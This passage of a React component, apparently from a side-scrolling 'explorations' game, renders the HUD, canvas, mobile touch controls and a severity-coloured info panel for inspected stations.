    if (dir === "left") g.keys["ArrowLeft"] = false;
    if (dir === "right") g.keys["ArrowRight"] = false;
  }, []);

  const sevColors = { critical: "#ff5555", high: "#ffaa33", medium: "#44cc88", info: "#66aaff" };
  const sevBg = { critical: "rgba(255,85,85,0.1)", high: "rgba(255,170,51,0.1)", medium: "rgba(68,204,136,0.1)", info: "rgba(102,170,255,0.1)" };

  return (
    <div style={{ position: "fixed", inset: 0, background: BG, zIndex: 10, display: "flex", flexDirection: "column" }}>
      {/* Back button */}
      <button onClick={onBack} style={{
        position: "absolute", top: 12, left: 12, zIndex: 100,
        background: "rgba(10,10,15,0.85)", border: `1px solid rgba(74,170,153,0.3)`,
        color: ACCENT, fontFamily: "'SF Mono', 'Fira Code', monospace",
        fontSize: 11, letterSpacing: 2, padding: "6px 14px",
        borderRadius: 6, cursor: "pointer", textTransform: "uppercase",
      }}>← explorations</button>

      {/* HUD */}
      <div style={{
        display: "flex", justifyContent: "space-between", alignItems: "center",
        padding: "10px 16px", paddingLeft: 180, background: "rgba(0,0,0,0.4)",
        borderBottom: "1px solid rgba(255,255,255,0.06)", flexShrink: 0,
      }}>
        <div>
          <span style={{ color: currentStation.color, fontSize: 11, letterSpacing: 2, fontFamily: "monospace" }}>STATION {currentStation.num}</span>
          <span style={{ color: "#ccc", fontSize: 14, marginLeft: 12, fontWeight: 500 }}>{currentStation.name}</span>
          <span style={{ color: "rgba(255,255,255,0.35)", fontSize: 11, marginLeft: 8 }}>{currentStation.sub}</span>
        </div>
        <div style={{ color: "rgba(255,255,255,0.25)", fontSize: 10, fontFamily: "monospace" }}>
          {isMobile ? "use controls below" : "[←→] move · [↑/space] jump · [E] inspect"}
        </div>
      </div>

      {/* Canvas */}
      <div style={{ flex: 1, position: "relative", minHeight: 0 }}>
        <canvas ref={canvasRef} tabIndex={0} onClick={() => canvasRef.current?.focus()}
          style={{ display: "block", width: "100%", height: "100%", outline: "none" }} />
      </div>

      {/* Mobile controls */}
      {isMobile && (
        <div style={{
          display: "flex", justifyContent: "space-between", padding: "8px 12px",
          background: "rgba(0,0,0,0.5)", borderTop: "1px solid rgba(255,255,255,0.06)", flexShrink: 0,
        }}>
          <div style={{ display: "flex", gap: 8 }}>
            {["left", "right"].map(d => (
              <button key={d}
                onTouchStart={(e) => { e.preventDefault(); mobileMove(d); }}
                onTouchEnd={(e) => { e.preventDefault(); mobileStop(d); }}
                onMouseDown={() => mobileMove(d)} onMouseUp={() => mobileStop(d)}
                style={{ width: 52, height: 44, background: "rgba(255,255,255,0.08)", border: "1px solid rgba(255,255,255,0.15)", borderRadius: 8, color: "#aaa", fontSize: 18, cursor: "pointer", touchAction: "none" }}>
                {d === "left" ? "◀" : "▶"}
              </button>
            ))}
          </div>
          <div style={{ display: "flex", gap: 8 }}>
            <button onTouchStart={(e) => { e.preventDefault(); mobileMove("jump"); }} onMouseDown={() => mobileMove("jump")}
              style={{ width: 52, height: 44, background: "rgba(255,255,255,0.08)", border: "1px solid rgba(255,255,255,0.15)", borderRadius: 8, color: "#aaa", fontSize: 12, cursor: "pointer", touchAction: "none" }}>JUMP</button>
            <button onTouchStart={(e) => { e.preventDefault(); mobileMove("inspect"); }} onMouseDown={() => mobileMove("inspect")}
              style={{ width: 52, height: 44, background: "rgba(74,170,153,0.15)", border: "1px solid rgba(74,170,153,0.4)", borderRadius: 8, color: ACCENT, fontSize: 12, fontWeight: 700, cursor: "pointer", touchAction: "none" }}>[E]</button>
          </div>
        </div>
      )}

      {/* Info panel */}
      {info && (
        <div style={{
          background: "rgba(10,12,20,0.97)", borderTop: `2px solid ${sevColors[info.severity] || ACCENT}`,
          padding: "14px 18px", flexShrink: 0, position: "relative", maxHeight: "35vh", overflowY: "auto",
        }}>
          <button onClick={() => setInfo(null)} style={{
            position: "absolute", top: 10, right: 14, background: "none", border: "none",
            color: "rgba(255,255,255,0.4)", cursor: "pointer", fontSize: 18, fontFamily: "monospace",
          }}>×</button>
          <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 8 }}>
            <span style={{ fontSize: 15, fontWeight: 600, color: "#ddd" }}>{info.title}</span>
            <span style={{
              fontSize: 10, padding: "2px 8px", borderRadius: 4, fontWeight: 600, letterSpacing: 1,
              background: sevBg[info.severity], color: sevColors[info.severity], textTransform: "uppercase",
            }}>{info.severity}</span>
          </div>
          <div style={{ fontSize: 13, color: "rgba(255,255,255,0.7)", lineHeight: 1.7, maxWidth: 700 }}>{info.body}</div>
          <div style={{ marginTop: 10, fontSize: 11, color: "rgba(255,255,255,0.25)" }}>
            Station {STATIONS[info.station].num} — {STATIONS[info.station].name}
          </div>
        </div>
      )}
    </div>
  );
}
